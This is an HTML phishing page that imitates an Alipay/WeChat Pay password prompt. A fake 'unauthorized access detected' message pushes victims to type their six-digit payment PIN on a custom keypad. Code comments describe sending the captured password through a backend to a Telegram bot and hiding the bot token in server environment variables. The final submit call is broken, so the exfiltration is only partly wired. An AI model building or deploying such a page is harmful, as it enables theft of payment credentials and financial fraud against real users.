<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Alipay Password Input</title>
<style>
  :root {
    --max-width: 420px;
  }
  * { box-sizing: border-box; }
  body {
    font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
    margin: 0;
    padding: 0;
    background: rgb(250, 250, 250);
    color: rgb(51, 51, 51);
    min-height: 100vh;
    display: flex;
    justify-content: center;
  }

  .page {
    width: 100%;
    max-width: var(--max-width);
    padding: 20px;
    position: relative;
  }

  header {
    text-align: center;
    padding-top: 28px;
    padding-bottom: 10px;
    position: relative;
  }

  .header-image {
    width: 88px;
    height: 88px;
    display: inline-block;
    border-radius: 12px;
    object-fit: contain;
    background: transparent;
    vertical-align: middle;
  }


  .header-text {
    margin-top: 12px;
  }
  .header-text h4 {
    margin: 6px 0 4px;
    font-size: 18px;
    font-weight: 600;
  }
  .header-text p {
    margin: 0;
    color: rgb(102, 102, 102);
    font-size: 13px;
  }


  .container {
    margin-top: 24px;
    display: flex;
    align-items: center;
    flex-direction: column;
    gap: 18px;
  }

  .pin-row {
    display: flex;
    gap: 8px;
    justify-content: center;
    width: 100%;
  }
  .pin-row input {
    width: 48px;
    height: 48px;
    border-radius: 6px;
    border: 1px solid rgb(216, 216, 216);
    text-align: center;
    font-size: 24px;
    letter-spacing: 2px;
    background: rgb(255, 255, 255);
    -webkit-appearance: none;
  }

  .keyboard {
    width: 100%;
    max-width: 360px;
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 8px;
    margin-top: 8px;
  }

  .key {
    background: rgb(255, 255, 255);
    border: 1px solid rgb(230, 230, 230);
    padding: 14px 0;
    font-size: 20px;
    text-align: center;
    border-radius: 8px;
    cursor: pointer;
    user-select: none;
    font-weight: 600;
    transition: background .08s, transform .06s;
  }
  .key:active { transform: translateY(1px); }
  .key.special {
    background: rgb(247, 247, 247);
  }
  .actions {
    display:flex;
    gap: 8px;
    width: 100%;
    justify-content: center;
    margin-top: 12px;
  }
  .btn {
    padding: 10px 16px;
    border-radius: 8px;
    border: none;
    cursor: pointer;
    font-weight: 600;
    font-size: 15px;
  }
  .btn.primary {
    background: rgb(22, 119, 255);
    color: white;
  }
  .btn.ghost {
    background: transparent;
    border: 1px solid rgb(221, 221, 221);
  }

  footer {
    margin-top: 18px;
    text-align:center;
    color:rgb(153, 153, 153);
    font-size:12px;
  }

  .error-message {
    color: rgb(245, 108, 108);
    font-size: 14px;
    text-align: center;
    margin-bottom: 12px;
    padding: 8px 16px;
    background: rgb(254, 240, 240);
    border-radius: 6px;
    border: 1px solid rgb(252, 226, 226);
    display: none;
    animation: shake 0.3s ease-in-out;
  }

  .error-message.show {
    display: block;
  }

  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    25% { transform: translateX(-8px); }
    75% { transform: translateX(8px); }
  }
</style>
</head>
<body>
  <div class="page" role="main">
    <header>
      <!-- 已验证可显示的支付宝 Logo PNG Base64（蓝底白字）-->
     <img src="data:image/png;base64,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" alt="Header Image" class="header-image">

      <div class="header-text" aria-hidden="true">
        <h4>检测到未经授权</h4>
        <p>请验证微信支付密码才能访问应用程序</p>
      </div>
    </header>

    <div class="container" aria-live="polite">
      <div class="error-message" id="errorMessage"></div>
      <div class="pin-row" id="pinRow" aria-label="输入支付密码">
        <input id="p1" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
        <input id="p2" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
        <input id="p3" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
        <input id="p4" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
        <input id="p5" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
        <input id="p6" class="pin" type="password" maxlength="1" inputmode="numeric" readonly />
      </div>

      <div class="keyboard" role="application" aria-label="数字键盘">
        <div class="key" onclick="press('1')">1</div>
        <div class="key" onclick="press('2')">2</div>
        <div class="key" onclick="press('3')">3</div>
        <div class="key" onclick="press('4')">4</div>
        <div class="key" onclick="press('5')">5</div>
        <div class="key" onclick="press('6')">6</div>
        <div class="key" onclick="press('7')">7</div>
        <div class="key" onclick="press('8')">8</div>
        <div class="key" onclick="press('9')">9</div>
        <div class="key special" onclick="submitPin()">✓</div>
        <div class="key" onclick="press('0')">0</div>
        <div class="key special" onclick="backspace()">⌫</div>
      </div>

      <div class="actions">
        <button class="btn ghost" onclick="clearPin()">清除</button>
        <!-- 按钮会调用后端 API，将密码发送给后端，再由后端发送到 Telegram -->
        <button class="btn primary" onclick="submitPin()">提交</button>
      </div>
    </div>

  
  </div>

<script>
  // 不要在前端放置真实 bot token! —— 安全警告：在前端暴露 token 会被任何人看到并滥用
  // 推荐做法：前端只把密码提交到你自己后端，例如 POST /send-alipay-pass
  // 后端从 ENV 中读取 TELEGRAM_BOT_TOKEN 并调用 Telegram API 发送消息。

  const pins = Array.from(document.querySelectorAll('.pin'));
  const errorMessage = document.getElementById('errorMessage');
  
  function showError(message) {
    errorMessage.textContent = message;
    errorMessage.classList.add('show');
    setTimeout(() => {
      errorMessage.classList.remove('show');
    }, 3000);
  }

  function hideError() {
    errorMessage.classList.remove('show');
  }

  function getCurrentIndex() {
    for (let i = 0; i < pins.length; i++) {
      if (!pins[i].value) return i;
    }
    return pins.length;
  }

  function press(d) {
    hideError();
    const idx = getCurrentIndex();
    if (idx < pins.length) {
      pins[idx].value = d;
    }
  }

  function backspace() {
    // 删除最后一个非空
    for (let i = pins.length - 1; i >= 0; i--) {
      if (pins[i].value) {
        pins[i].value = '';
        break;
      }
    }
  }

  function clearPin() {
    pins.forEach(p => p.value = '');
  }

  function getPinValue() {
    return pins.map(p => p.value || '').join('');
  }

  async function submitPin() {
    const pin = getPinValue();
    if (pin.length !== pins.length) {
      showError('请输入完整的 6 位密码');
      return;
    }
    hideError();
    submit.call(pin);
  
  }


</script>
</body>
</html>
